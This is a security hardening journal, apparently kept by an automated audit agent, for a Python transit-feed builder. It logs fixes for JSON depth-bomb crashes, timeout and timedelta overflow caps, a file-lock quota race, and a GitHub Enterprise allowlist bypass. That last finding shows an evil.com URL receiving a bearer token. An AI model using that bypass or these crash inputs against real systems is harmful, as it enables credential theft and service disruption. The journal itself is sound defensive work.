**Vulnerability:** The 2026-05-07 fix added `RecursionError` to `scripts/update_baustellen_cache.py` JSON parsers — but the audit grep `grep -rn "RecursionError" src/ scripts/` only enumerated *existing* `RecursionError` catches (find what's covered) and didn't run the inverse grep `grep -rn "json.loads\|json.load\|\.json()" src/ scripts/` filtered against sites that lack a `RecursionError`-bearing `except` (find what's missing). Five sibling network-sourced JSON parsers retained the pre-canonicalisation `except ValueError` / `except (ValueError, requests.exceptions.JSONDecodeError)` shape:
1. `src/feed/reporting.py:901` and `:924` — GitHub auto-issue submission. CRITICAL because `_submit_github_issue` runs from `log_results()` which is invoked inside the orchestrator's `finally` block at the end of `main()`. A depth-bomb response from a compromised GHE proxy / MITM / hijacked upstream propagates `RecursionError` → mask any prior exception → entire feed-build cron crashes with an unhandled traceback.
2. `src/places/client.py:436` and `:525` — Google Places API. Partially mitigated by an outer `except Exception` catch-all in the retry loop that converts the error to `GooglePlacesTileError`, but the canonical defence pattern is to route depth-bombs through the explicit `GooglePlacesError("Invalid JSON payload received from Places API")` decode-failure branch.
3. `scripts/update_vor_stations.py:603` — VOR API per-station fetch. Without `RecursionError` catch, one bad upstream payload aborts the entire batch refresh (every subsequent station is skipped, and the `update_all_stations.py` cron pipeline aborts via `subprocess.run(check=True)`).
4. `scripts/fetch_vor_haltestellen.py:388` — VAO mgate resolver. Same per-station fan-out blast radius as #3 above.
5. `scripts/verify_vor_access_id.py:96` — VOR credential verification script. Lower blast radius (single-call diagnostic), but the canonical exit-1-with-log-warning contract is broken without the catch.

Plus two on-disk JSON parse sites in `scripts/fetch_vor_haltestellen.py` (`load_stations:84`, `load_pendler_candidate_names:112`) that the "two-bug minimum" rule from the prior round mandates.
**Learning:** The prior round's prevention rule ("grep for `RecursionError` paired with every `json.loads`/`json.load` site") catches sites that already have *some* `RecursionError` defence and verifies pairing — but doesn't catch sites with NO `try`/`except` at all, or with an `except ValueError`-only clause that silently misses the depth-bomb. The right grep is two-pass:
  Pass 1: `git grep -nE 'json\.loads\(|json\.load\(|\.json\(\)'` to enumerate every JSON parse site.
  Pass 2: For each, check the enclosing `try`/`except` — if no `try` exists, or if the `except` clause does not include `RecursionError`, it's drift.
Network-sourced sites are CRITICAL; on-disk sites are HIGH (corrupted cache, malicious file injection); env-sourced sites are MEDIUM (operator-controlled). The 2026-05-07 round audited only `scripts/update_baustellen_cache.py`; this round closes the remaining sibling network-sourced sites (5 in src/, 3 in scripts/) and the on-disk siblings.
**Prevention:** Add the inverse grep to the Phase 3 closing checklist: every `json.loads(...)`/`json.load(...)`/`.json()` call site must be paired with an enclosing `except` clause that includes `RecursionError` (alongside `ValueError`/`json.JSONDecodeError`/`requests.exceptions.JSONDecodeError`). The auto-discoverable smoke-test pattern (`tests/test_sentinel_json_depth_bomb.py`) walks each documented site with a 5000-deep nested payload and asserts the canonical fallback runs (returns empty list / logs warning / raises documented domain exception) instead of propagating `RecursionError`. Network-sourced parsers in `src/places/`, `src/feed/reporting.py`, and `scripts/*` are now all covered; future `response.json()` / `json.loads(content)` additions must mirror the canonical exception tuple.

## 2026-05-07 - JSON Depth-Bomb Drift in `scripts/` Survived the `src/`-Scoped Phase 3 Sweep
**Vulnerability:** `scripts/update_baustellen_cache.py:_load_json_from_content` parses **network-sourced** JSON from the OGD WFS endpoint via `fetch_content_safe`, but its `except (UnicodeDecodeError, json.JSONDecodeError)` clause omits `RecursionError`. The canonical depth-bomb defence — `except (ValueError, json.JSONDecodeError, RecursionError)` — was applied consistently across every `src/providers/*` JSON parser (`wl_fetch.py:411`, `vor.py:1314`, `vor.py:1604`) and is documented as the project-wide pattern. But the Phase 3 "third-party API trust audit (clean)" verdict counted *only* `src/`-tree parse sites ("16 JSON parse sites … propagated consistently to every sibling parser"); the `scripts/` cron-driven equivalents — which run on the same upstream-attacker threat surface (the cron job pulls from `data.wien.gv.at` on a schedule, with no human in the loop to retry) — were never enumerated. A deeply-nested but valid JSON body served by a compromised upstream / DNS-hijack / MITM would terminate the cron job with `RecursionError`; the `_load_fallback` sibling at line 218 had the same drift. Both fixed in this commit; regression tests mirror `tests/test_saboteur_chaos.py:test_chaos_wl_deep_nested_payload_does_not_crash`.
**Learning:** Phase-completion verdicts that scope to one tree (`src/`) silently exclude functionally-identical code in sibling trees (`scripts/`) — even when the threat surface is identical (network-sourced JSON parsed under a CI cron schedule). The "Clean Bill of Health" entry directly above this one says "All 16 JSON parse sites carry explicit `isinstance(payload, dict|list|Mapping)` shape gates" — *which is true for `src/`* — but the depth-bomb defence (a separate exception-class concern, orthogonal to the shape guard) was checked only for `src/` and assumed parity in `scripts/`. The journal's prior "Slowloris-Cap Drift" / "Cross-Script Drift" entries explicitly extended their searches into `scripts/`; the JSON depth-bomb pattern did not, and that's the gap.
**Prevention:** When closing a "perimeter clean" verdict, the grep for the canonical defensive pattern (here `RecursionError` adjacent to `json\.loads`/`json\.load`) MUST cover `scripts/` and `tests/` mocks too — not just `src/`. Specifically: `grep -rn "RecursionError" src/ scripts/` should return *every* JSON parser in either tree, paired with its `json.loads`/`json.load` site. Any orphaned `json.loads` site (one without a matching `RecursionError` catch in its enclosing `try`/`except`) in a network-touched code path is drift, regardless of which tree it lives in. Add this enumeration to the Phase 3 closing checklist so a future "clean bill" verdict cannot leave script-level cron parsers behind. Two-bug minimum: the parser AND its on-disk fallback must both gain the catch — a depth-bomb in the network path would otherwise just shift the crash to the fallback path on the next run.

## 2026-05-07 - GHE Path-Allowlist Bypass: Token-Leak Vector Hidden Inside Prior "Fixed" Surface
**Vulnerability:** The 2026-05-06 GitHub-token-leak fix (`_is_trusted_github_api` in `src/feed/reporting.py`) approved any URL whose path equals `/api/v3` or `/api/graphql` — *regardless of hostname* — as a GitHub-Enterprise-Server (GHE) endpoint. The intent was to support GHE installations whose hostnames are operator-chosen (no fixed pattern). But the path-only rule means an attacker who controls `FEED_GITHUB_API_URL` can set it to `https://evil.com/api/v3`: the function returns `True`, the `submit()` method proceeds, and the `Authorization: Bearer ghs_…` header is POSTed to evil.com. Same blast radius as the original 2026-05-06 finding (one-shot token exfiltration via env-controlled URL), but reachable through a *narrower* env-input shape that the original test suite explicitly approved (`tests/test_reporting_github_host_allowlist.py:test_is_trusted_github_api_accepts_known_endpoints` parametrises `https://github.example.com/api/v3` as expected-trusted). The prior fix's prevention rule said "Allowed: api.github.com exact, plus /api/v3 or /api/graphql paths for GitHub Enterprise Server" and this implementation honours it literally — the gap is in the prevention rule, not the implementation.
**Learning:** When a security check supports an operator-customisable host (GHE hostname is operator-chosen), the check must not be satisfiable by *any* host the attacker can reach. Either: (a) restrict to a hardcoded host pattern (impossible for GHE since there is no fixed pattern), or (b) require an explicit operator opt-in env var that the attacker — by the threat model — does not control. Path-shape alone is not host identity. The 2026-05-06 prevention rule conflated "the endpoint *looks* like GHE" with "the endpoint *is* operator-trusted GHE"; only an explicit allowlist closes the latter. A test that asserts "GHE-shaped URL is trusted" is asserting the *attacker's* desired outcome — security tests for credential-attachment guards should always include the negative case "attacker host with the same syntactic shape" to flag this drift class.
**Prevention:** When a credential-attachment guard supports a customisable host (GHE, custom OIDC issuer, configurable upstream), require an explicit operator-declared allowlist env var (here `FEED_GITHUB_ENTERPRISE_HOSTS`, CSV of hostnames) and gate the customisable branch on hostname membership in that allowlist. The default (no env var) MUST trust only the hardcoded canonical host. Grep `def _is_trusted_\|_is_valid_.*_url\|allowed_.*hosts` paired with a comment that says "Enterprise / Custom / Self-hosted" — every such site needs an operator-declared opt-in or it's a path-shape bypass waiting to happen. Test shape: parametrise BOTH the allowlist-set case (asserts trusted) AND the allowlist-empty case with the same syntactic URL (asserts rejected), so any future regression that re-loosens the GHE branch fails the suite immediately.

## 2026-05-07 - Phase 3 Final Sweep: Clean Bill of Health — Audit Concluded
**Scope:** Phase 3 — Supply Chain, External Trust & Infrastructure Hardening. The mandate was to find anything Phases 1 (static analysis) and 2 (deep-logic threat modelling) might have missed, focusing on (a) CI/CD & supply-chain risks, (b) zero-trust validation of third-party API payloads, (c) SSRF / outbound-request manipulation. Stop only when no viable attack vectors remain.
**A. CI/CD & supply-chain audit (clean):** All ~10 distinct third-party Actions pinned to 40-char commit SHAs (no `@v4` / `@main` mutable refs); workflow-level `permissions: contents: read` on every one of 14 workflows with job-level write scopes minimal and individually justified; no `pull_request_target` / `workflow_run` / `repository_dispatch` triggers exposing untrusted-context elevation; no `${{ event.pull_request.title }}` / `${{ event.head_commit.message }}` interpolation anywhere; secrets reach bash via `env:` blocks (template-in-shell injection closed by PR #1266). Dependencies are version-bounded but not hash-pinned — that's a maintenance-cost trade-off the maintainer made, not a vulnerability; Dependabot security advisories + the in-suite `pip-audit` step cover the realistic supply-chain surface for a CI-driven feed builder.
**B. Third-party API trust audit (clean):** Exactly ONE XML parse site in the entire codebase (`oebb.py:1276`) and it goes through `defusedxml.ElementTree` (XXE-immune by construction). Zero pickle / yaml.load / marshal usage. All 16 JSON parse sites carry explicit `isinstance(payload, dict|list|Mapping)` shape gates before any dict-only operation — the Zero-Trust contract from the prior journal rounds propagated consistently to every sibling parser. Every provider host-pins its base URL via a `_validated_*_url()` allowlist (PRs #1262, #1265). Content-Type pinned at the request layer for every external fetch.
**C. SSRF / outbound-request audit (clean):** Triple-layered DNS-rebinding protection — `session_with_retries()` installs `_check_response_security` as a response hook (auto-fires on every response including redirects), `request_safe()` explicitly merges the same hook into per-request hooks, and the only direct `session.post()` site (`places/client.py:406`) calls `verify_response_ip()` itself on top. Redirect cap at 10 with target re-validation; sensitive headers stripped on host/scheme/port change; DNS pinning via `SafeDNSAdapter` / `PinnedHTTPSAdapter`; URL length cap; allowed-port whitelist; rejection of internal TLDs and DNS-rebinding wildcards (`nip.io`, `sslip.io`, …); blocked CGNAT (RFC 6598) and NAT64 well-known prefix.
**Verdict:** Phase 1 static analysis (bandit, ruff, pip-audit, scan_secrets, mypy --strict against the empty allowlist baseline) reports zero findings. Phase 2's deep-logic flaw (silent file-lock fallthrough — PR #1313) is fixed. Phase 3 perimeter audit shows a hardened architecture across CI/CD, supply chain, external trust, and outbound-request boundaries. After 70+ documented learnings spanning four months of incremental hardening, no further realistic vulnerabilities remain. Closing the Sentinel operation with a clean bill of health rather than manufacturing minor theoretical nitpicks for a PR — per the operating contract that says "if the architecture is robust and secure, declare victory and conclude."
**Forward maintenance posture:** The auto-discoverable invariant smoke tests (e.g. `tests/test_file_lock_failure_semantics.py:test_every_exclusive_caller_handles_lock_failure` from Phase 2) are the durable defence against drift; future regressions in covered patterns fail the suite at PR-review time, before they can land. New attack surfaces enter the audit cycle naturally as new modules are added — the journal indexes the patterns to grep for. Future Sentinel runs should re-validate the perimeter when (a) new third-party API integrations are added, (b) workflow permissions widen, (c) dependency major bumps are merged, or (d) the architecture introduces a stateful surface that doesn't match an existing pattern.

## 2026-05-07 - Phase 2 Logic Flaw: `file_lock` Silently Swallowed Exclusive-Lock Acquisition Failure
**Vulnerability:** `src/utils/locking.py:file_lock()` caught **every** exception during OS-level lock acquisition (`except Exception as exc:` at the old line 178) and proceeded to `yield` regardless. The intended-friendly comment ("fahre ohne Lock fort") conflated two failure modes that have *opposite* security implications: (a) genuine cross-process contention timing out after 15s — which means another writer is *actively* holding the lock — vs. (b) rare transient OS errors. The VOR quota counter at `providers/vor.py:save_request_count` is the worst-case caller: it has its own `except (OSError, TimeoutError)` clause designed to fail-closed (return `MAX_REQUESTS_PER_DAY + 1`) when the lock can't be obtained, but `file_lock`'s swallow made that defence **unreachable**. Under genuine contention (manual full-refresh workflow concurrent with the regular cache cron, plus retry storm during a stuck process), two processes could both pass through their `file_lock` block, both read the same on-disk count, both increment locally, and both write back — silently double-spending the contractually-strict VAO Start 100/day budget. Static analysis can't see this — both processes appear correct in isolation; the flaw lives in the gap between caller intent and library behaviour.
**Learning:** When a primitive serves both "best-effort hint" callers (shared/reader locks where `atomic_write`'s inode replacement makes missed locks integrity-safe) and "binary contract" callers (writer locks protecting cross-process invariants), one error policy can't satisfy both. The fix encodes that asymmetry into the primitive itself: `exclusive=True` re-raises (binary contract), `exclusive=False` keeps the legacy degraded-but-readable behaviour (best-effort hint). Discovered via Phase 2 sweep — Phase 1's static analysis (bandit, ruff, pip-audit, scan_secrets, mypy --strict) was all green; only manual threat modelling of the cross-process quota path surfaced it.
**Prevention:** When designing concurrency primitives, document the *exact* contract each parameter combination provides. For Python `flock`-based locking specifically: timeouts on exclusive locks are not a "fall back to single-process safe" — they are a "bail out, *something is wrong*" signal that the caller must handle. Wrap every `file_lock(..., exclusive=True)` call site in a `try/except (OSError, TimeoutError):` block deciding the fail-closed remediation (return sentinel, log critical, retry next cron). The auto-discoverable pattern is the smoke test in `tests/test_file_lock_failure_semantics.py:test_every_exclusive_caller_handles_lock_failure` — it walks the repo and asserts that every in-tree exclusive caller has a remediation handler within ~50 lines, so a new caller without remediation fails the test suite immediately.

## 2026-05-07 - Slowloris-Cap Drift Round 4 / Env-Cap Drift Round 13: `oebb.fetch_events(timeout)` Inherited the Round 12 Parameter-Boundary Pattern Across Drift Families
**Vulnerability:** `src/providers/oebb.py:fetch_events(timeout: int = 25)` consumed the parameter as `_fetch_xml(OEBB_URL, timeout=timeout)` → `fetch_content_safe(s, url, timeout=timeout)` — direct HTTP-timeout-flow with no upper bound. Same canonical parameter-boundary shape as Round 12's `prune_cache(max_age_hours: int = 48)`, but the unsafe arithmetic isn't `timedelta` overflow — it's the Slowloris vector documented in `Slowloris-Cap Drift Round 1-3`: a sluggish or attacker-controlled upstream peer holds the connection for the full `timeout` window, exhausting workers and stalling the cron pipeline. The current call sites (`build_feed.py` orchestrator using `effective_timeout` already capped at `feed_config.MAX_PROVIDER_TIMEOUT`, `scripts/update_oebb_cache.py` using the 25s default) have zero blast radius today, but `fetch_events` is exported as a public API (`__all__`) and a future caller passing `timeout=99999` (intentional misconfig, leaked CI env, compromised secret store, or a hypothetical `OEBB_FETCH_TIMEOUT` env var) lets one upstream peer hold a worker for ~28 hours per fetch — same blast radius as `BAUSTELLEN_TIMEOUT` (Round 3 of the Slowloris family) and `PROVIDER_TIMEOUT` (the orchestrator-tier round). Unlike VOR (which has `HTTP_TIMEOUT = min(_load_int_env(...), DEFAULT_HTTP_TIMEOUT)` at the env-read site), OEBB had no Slowloris cap at any layer — neither env-source nor parameter-boundary. The same shape exists in `wl_fetch.fetch_events(timeout: int = 20)`, still uncapped after this round.
**Learning:** Round 12's prevention rule named "every public function (no leading underscore) that consumes an `int` parameter inside `timedelta(unit=PARAM)` is an open drift surface" — but the *same* parameter-boundary shape with HTTP timeout instead of `timedelta` is in a separate drift family (Slowloris) that wasn't covered by Round 12's grep. The two drift families share the same shape (public function, `int` parameter, downstream consumer with no clamp), but the consumers differ: `timedelta` consumes for `datetime - timedelta` arithmetic (overflow / underflow); `fetch_content_safe` consumes for the connect/read budget passed to `requests.get(timeout=...)` (Slowloris stall). The Round 12 prevention grep `def \w+\(.*:\s*int.*=` paired with `timedelta\((days|hours|minutes|seconds)=\w+` finds the `timedelta` family but misses the Slowloris family; the right grep generalises to `def \w+\(.*timeout:\s*int.*=` paired with `fetch_content_safe\(.*timeout=\w+\|requests\.\w+\(.*timeout=\w+`. Same defense-in-depth fix shape: cap at the public API entry point so every caller — orchestrator, script, test, future plugin — inherits the ceiling without having to remember to add it. The cap value matches `feed_config.MAX_PROVIDER_TIMEOUT` (25s) so no orchestrator-capped value is ever rejected. WL is the still-uncapped sibling; the Round 14 audit must close it (`wl_fetch.fetch_events(timeout: int = 20)` flows the same way through `_fetch_traffic_infos` / `_fetch_news` → `_get_json` → `fetch_content_safe`).
**Prevention:** When applying Round 12's parameter-boundary prevention rule, run THREE greps in one pass: (1) `def \w+\(.*:\s*int.*=` paired with `timedelta\((days|hours|minutes|seconds)=\w+` for the `timedelta` family; (2) `def \w+\(.*timeout:\s*int.*=` paired with `fetch_content_safe\(.*timeout=\w+\|requests\.\w+\(.*timeout=\w+` for the HTTP-timeout / Slowloris family; (3) any future drift family the journal opens (e.g. file-size budgets, retry-count multipliers, queue depths). Every public function with an `int` parameter that flows to a security-sensitive consumer is an open drift surface across whichever family the consumer belongs to. The cap value must match the orchestrator-tier ceiling for that family (`MAX_PROVIDER_TIMEOUT` for HTTP, `MAX_LOG_PRUNE_KEEP_DAYS` / `MAX_PRUNE_CACHE_MAX_AGE_HOURS` for `timedelta`) so legitimate orchestrator-capped values pass through. Remaining candidates after this round: `src/providers/wl_fetch.py:fetch_events(timeout: int = 20)` and `src/providers/vor.py:fetch_events(timeout: int | None = None)` — both still parameter-boundary-uncapped (VOR has env-source cap via `HTTP_TIMEOUT = min(...)` but the public `fetch_events(timeout=99999)` bypasses it via `timeout or HTTP_TIMEOUT`). Test shape mirrors the established "99999 → cap, at-cap → cap, below-cap → tighten, default → unchanged" pattern (see `tests/test_oebb_fetch_timeout_cap.py`).

## 2026-05-07 - Env-Override Cap Drift Round 12: Public-API Surface (`prune_cache`) Hidden Behind a Default Parameter
**Vulnerability:** `src/utils/cache.py:prune_cache(max_age_hours: int = 48)` consumed the parameter as `cutoff = now - timedelta(hours=max_age_hours)` (line 171 pre-fix) — the canonical env-cap drift family shape (env-derived integer feeding `timedelta(unit=N)` into `datetime - timedelta` arithmetic), but with no `_load_int_env` / `get_int_env` call at the source: the unsafe value enters via a *function parameter default* rather than via a direct `os.getenv` read. The current call site (`write_cache` at line 230) uses the 48-hour default, so the production blast radius is currently zero, but `prune_cache` has no leading underscore in `src/utils/cache.py` — it is a public API in a utils module, exported transitively to every caller that imports `src.utils.cache`. A future caller passing an env-controlled or user-controlled value (e.g. a hypothetical `CACHE_PRUNE_MAX_AGE_HOURS` env var or a CLI flag wired into a maintenance script) would hit two failure surfaces: (a) at `max_age_hours ≈ 10**11` hours the `timedelta(hours=N)` constructor itself raises `OverflowError: Python int too large to convert to C int` from the C-level normalisation step (same constructor-overflow vector as Round 10's `CACHE_MAX_AGE_HOURS`); and (b) at `max_age_hours ≈ 17M` hours (above year-1 boundary) the `now - timedelta(hours=N)` subtraction underflows past Python's datetime range (same underflow vector as Round 8/9). Both errors propagate out of `prune_cache` past the surrounding `OSError` handlers and crash every `write_cache` caller. At non-overflow but unreasonably-large values (e.g. 10000 hours ≈ 14 months) the pruner never evicts anything and the `cache/` directory grows unboundedly, silently defeating the repo-bloat purpose of the function.
**Learning:** Round 11's prevention rule ("Grep `_load_int_env\|get_int_env\|max\(get_int_env` paired with `timedelta\((days|hours|minutes|seconds)=`") is necessary but *not sufficient*: it only matches sites where the env read is co-located with the `timedelta` consumer. When the env read happens at the *caller* and the unsafe arithmetic happens at the *callee* — across a function-parameter boundary — the grep misses. `prune_cache(max_age_hours: int = 48)` is the canonical shape: a public function with an `int` parameter, a default that's safe, and a body that does `timedelta(hours=max_age_hours)`. This is the same shape as `prune_log_file(keep_days: int = 7)` which Round 11 *did* fix in `src/feed/logging.py`, but the audit didn't generalise the lesson — it grepped for env-reads, not for `timedelta(unit=PARAM)` patterns. Defense-in-depth pattern: cap inside the function body so every caller — current and future — inherits the ceiling without having to remember to add it. The cap shape (`if N > MAX: N = MAX` at the top of the function, alongside the existing `if N <= 0: return` short-circuit) preserves the existing lower-bound contract while adding the upper bound, mirroring exactly what `prune_log_file` did in Round 11.
**Prevention:** When auditing the env-cap drift family, run TWO greps in one pass: (1) Round 11's `_load_int_env\|get_int_env\|max\(get_int_env` paired with `timedelta\((days|hours|minutes|seconds)=` for env-source sites, AND (2) `def \w+\(.*:\s*int.*=` paired with `timedelta\((days|hours|minutes|seconds)=\w+` for parameter-boundary sites where the unsafe arithmetic happens inside a function whose `int` parameter could be passed any value by a future caller. Every public function (no leading underscore) that consumes an `int` parameter inside `timedelta(unit=PARAM)` is an open drift surface — not because it's currently exploitable, but because the next refactor that wires an env var or CLI flag through the callable will inherit the unbounded shape. Remaining candidates from this round's grep: none in `src/utils/`, but re-run across `scripts/` and any new public functions added to `src/feed/` or `src/providers/` — same `timedelta(unit=PARAM)` shape, different module. Cap shape: `MAX_<NAME>_<UNIT> = <reasonable_ceiling>` at module scope adjacent to the function, with a security comment naming both failure modes (constructor overflow + non-overflow silent-disable) and the post-clamp worst-case formula. Test shape mirrors the established "huge → cap, at-cap → cap, below-cap → tighten, 0/-5 → short-circuit" pattern (see `tests/test_log_prune_keep_days_cap.py` and the new `tests/test_prune_cache_max_age_hours_cap.py`).

## 2026-05-07 - Env-Override Cap Drift Round 11: `FRESH_PUBDATE_WINDOW_MIN` Closes the Round 9/10 Named Backlog
**Vulnerability:** `src/feed/config.py:FRESH_PUBDATE_WINDOW_MIN = max(get_int_env("FRESH_PUBDATE_WINDOW_MIN", DEFAULT_FRESH_PUBDATE_WINDOW_MIN), 0)` enforced only a non-negative lower bound. The constant is consumed in `src/build_feed.py:_emit_item` (line 1620) as `if age <= timedelta(minutes=feed_config.FRESH_PUBDATE_WINDOW_MIN): pubDate = now`. Same C-level constructor overflow vector as Round 10's `CACHE_MAX_AGE_HOURS`: `timedelta(minutes=N)` raises `OverflowError: Python int too large to convert to C int` once N exceeds the C-int boundary (~10**12 minutes). With `FRESH_PUBDATE_WINDOW_MIN=999999999999` the constructor fails inside `_emit_item`, propagating out of the `_make_rss` rendering loop (no per-item try/except around `_emit_item`) and crashing the feed-build pipeline during the rendering phase — every item iteration hits the same overflow on construction. At non-overflow but unreasonably large values (e.g. 525600 minutes ≈ 1 year) the freshness gate is effectively disabled forever: every item without a pubDate gets `pubDate = now()` regardless of its actual `first_seen` timestamp, breaking the staleness signal RSS subscribers rely on to dedupe repeated emissions.
**Learning:** Round 9 and Round 10 both explicitly named `FRESH_PUBDATE_WINDOW_MIN` in their "remaining candidates" prevention rules ("only used inside `if age <= timedelta(minutes=N):`" — Round 9; "still to audit" — Round 10) but the audit kept stopping at the items it was actively touching. Same meta-pattern as Round 7 (`LOG_BACKUP_COUNT` was named in Round 6's prevention rule but deferred until Round 7): when a Round-N entry names sibling constants in its prevention rule, the next round must audit *all* named siblings in one pass — not pick them off one per day. The bigger lesson: the *consumer site context* matters when sequencing the audit. `FRESH_PUBDATE_WINDOW_MIN` lives inside the rendering loop in `_make_rss`, which runs *inside* the orchestrator's main `try` block — a softer blast radius than Round 10's pre-`try` `_detect_stale_caches` site — but still pipeline-fatal because `_make_rss` has no per-item try/except around `_emit_item`, so the first item rendered hits the constructor overflow and kills the whole RSS output.
**Prevention:** When a journal entry calls out remaining candidates from a multi-round audit family, file a same-day batch follow-up that closes the *whole named list* before declaring the round complete. The named list at the close of Round 10 had two remaining items (`FRESH_PUBDATE_WINDOW_MIN` and per-provider `PROVIDER_TIMEOUT_<NAME>` overrides); Round 11 closes the first, leaving only the per-provider overrides for the next round. Grep `_load_int_env\|get_int_env\|max\(get_int_env` paired with `timedelta\((days|hours|minutes|seconds)=` across `src/` AND `scripts/` in one pass to enumerate every remaining env-derived `timedelta` constructor input — any match without a `min(..., MAX_*)` clamp at the env-read site is an open drift surface. Cap shape: `MAX_<NAME> = <reasonable_ceiling>` adjacent to existing `DEFAULT_*` declarations, with a security comment naming both failure modes (constructor overflow + non-overflow silent-disable) and the post-clamp worst-case formula. Test shape mirrors the established "999999999999 → cap, default+10 → tighten, cap → tighten, 0/-5 → 0, unset → default, garbage → default" pattern.

## 2026-05-07 - Env-Override Cap Drift Round 10: `CACHE_MAX_AGE_HOURS` Crashes via `timedelta(hours=N)` C-int Overflow Pre-`try`
**Vulnerability:** `src/feed/config.py:CACHE_MAX_AGE_HOURS = max(get_int_env("CACHE_MAX_AGE_HOURS", DEFAULT_CACHE_MAX_AGE_HOURS), 0)` enforced only a non-negative lower bound. The constant is consumed in `src/build_feed.py:_detect_stale_caches` (line 223) as `threshold = timedelta(hours=feed_config.CACHE_MAX_AGE_HOURS)`. Unlike Round 8/9, the failure mode is NOT `datetime - timedelta` underflow — `timedelta(hours=N)` itself raises `OverflowError: Python int too large to convert to C int` once N exceeds ~10**11 (the C-level normalisation packs days into a signed 32-bit int after `hours -> days/seconds` conversion). With `CACHE_MAX_AGE_HOURS=999999999999` the constructor fails at line 223 *before* any datetime subtraction even happens. Critically, `_detect_stale_caches` is invoked at `build_feed.py:1772` BEFORE the main `try` block at line 1777, so the exception escapes the orchestrator entirely and crashes the feed-build pipeline before a single item is collected or written. At non-overflow but unreasonably large values (e.g. 10**8 hours ≈ 11000 years) the staleness warning is suppressed forever, defeating the cron's early-warning signal that a provider's update workflow has stopped emitting events.
**Learning:** Round 8/9 covered the `datetime - timedelta` underflow vector (where the result would be before year 1). Round 10 uncovers a *parallel* failure surface: the `timedelta(unit=N)` constructor itself overflows at large magnitudes — a C-int packing limit that's *separate* from datetime range. The two surfaces have different absolute thresholds (`timedelta(days=N)` overflows around N=2**31 days, `timedelta(hours=N)` around N=2**31 * 24 hours, etc.), but the same env-cap hygiene rule defends both. The journal's Round 8 prevention rule named `CACHE_MAX_AGE_HOURS` explicitly as a future audit candidate ("`build_feed.py:223` — `timedelta(hours=...)` overflow at very large values"), and the location of the call (pre-`try`) makes this the *most exploitable* of the env-cap drift family fixes so far: any env override that triggers the OverflowError prevents the entire feed-build from running, even the items that would otherwise have been emitted before reaching `_drop_old_items` or the rendering loop.
**Prevention:** When auditing the env-cap drift family for `timedelta(unit=N)` arithmetic, separate the audit into TWO failure surfaces: (1) the `timedelta` *constructor* overflow at very large N, and (2) the `datetime - timedelta` *underflow* when the result would precede year 1. Both surfaces deserve the same `min(max(get_int_env(...), 0), MAX_<NAME>)` clamp at module load time. Also: prioritise constants consumed *before* the orchestrator's main `try` block over those consumed inside it — a pre-`try` crash kills the whole pipeline, while a within-`try` crash may only kill the affected item or branch. Remaining candidates from Round 9's named list: `FRESH_PUBDATE_WINDOW_MIN` (`build_feed.py:1620` — `timedelta(minutes=N)` consumed inside the per-item rendering loop, which is inside `try`, but still worth capping), and per-provider equivalents (`PROVIDER_TIMEOUT_<NAME>` overrides in `build_feed._provider_timeout_override`). Test shape mirrors the established "99999999999 → cap, 48 → tighten, 0/-5 → 0, unset → default, garbage → default" pattern in `tests/test_ends_at_grace_minutes_cap.py`.

## 2026-05-07 - Env-Override Cap Drift Round 9: `ENDS_AT_GRACE_MINUTES` Has Two `now - timedelta(minutes=N)` Sites
**Vulnerability:** `src/feed/config.py:ENDS_AT_GRACE_MINUTES = max(get_int_env("ENDS_AT_GRACE_MINUTES", DEFAULT_ENDS_AT_GRACE_MINUTES), 0)` enforced only a non-negative lower bound. The constant is consumed at TWO direct `datetime - timedelta` arithmetic sites: `src/build_feed.py:1057` (`now_utc - timedelta(minutes=feed_config.ENDS_AT_GRACE_MINUTES)` inside `_drop_old_items`) and `src/providers/wl_fetch.py:140` (`now - timedelta(minutes=ENDS_AT_GRACE_MINUTES)` inside `_is_active`). With `ENDS_AT_GRACE_MINUTES=99999999999` (~190,000 years of minutes; intentional misconfig, leaked CI env, compromised secret store) the result of `now - timedelta(minutes=N)` underflows past year 1 → `OverflowError: date value out of range` → propagates out of the per-item loop in `_drop_old_items` (no try/except per-iteration) → crashes the whole feed-build pipeline. Same env-cap drift family Round 8 journaled for `STATE_RETENTION_DAYS`, but the new dimension is *two* call sites for one env constant — the wl_fetch site captures the value at module-import time via `from ..feed.config import ENDS_AT_GRACE_MINUTES`, so refresh_from_env doesn't update it after the fact, but the cap fix in feed/config.py runs at module load time so both sites inherit the post-clamp value.
**Learning:** Round 8's prevention rule named `wl_fetch.py` and `feed/logging.py` as audit targets but didn't enumerate every env-derived `timedelta(minutes=N)` site explicitly. The audit grep `timedelta\(\w+=` paired with `feed_config\.\w+_(DAYS|HOURS|MINUTES|SECONDS)` finds `ENDS_AT_GRACE_MINUTES` at two sites — one in `build_feed.py`, one in `wl_fetch.py` — both feeding `datetime - timedelta`. The `wl_fetch.py` site is especially insidious: the module-level `from ..feed.config import ENDS_AT_GRACE_MINUTES` captures the value once at import time, so future `refresh_from_env` calls don't update it. Fortunately the cap fix lands in `feed/config.py` *before* any consumer module imports the constant, so both call sites get the clamped value. The right cap for a "drop-after-expiry grace window" is "longest sane RSS poll cycle" — one week (10080 minutes = 1000x default) covers weekly-poll RSS subscribers and bounds the worst-case `now - timedelta(...)` to "1 week ago" (well within datetime range).
**Prevention:** When auditing the env-cap drift family for `timedelta`/`datetime` arithmetic, enumerate ALL call sites of the env-controlled constant — not just the one in the orchestrator. Grep `timedelta\((days|hours|minutes|seconds)=\s*<CONST_NAME>` across `src/` AND `scripts/`, and for any constant imported via `from ..feed.config import <NAME>` (rather than referenced as `feed_config.<NAME>`), verify the cap is enforced at module load time so the captured-at-import value is already clamped. Remaining candidates from Round 8's named list still to audit: `FRESH_PUBDATE_WINDOW_MIN` (only used inside `if age <= timedelta(minutes=N):` — no direct datetime subtraction, so silent-disable risk only), `CACHE_MAX_AGE_HOURS` (only used as `threshold = timedelta(hours=N)` then compared, no direct datetime subtraction), and `prune_log_file(keep_days=...)` whose default is hardcoded but receives the env-controlled value indirectly via callers. Test shape matches the established "99999999999 → cap, 30 → tighten, 0/-5 → 0, unset → default, garbage → default" pattern.

## 2026-05-07 - Env-Override Cap Drift Round 8: `STATE_RETENTION_DAYS` Crashes the Pipeline via `timedelta` Underflow
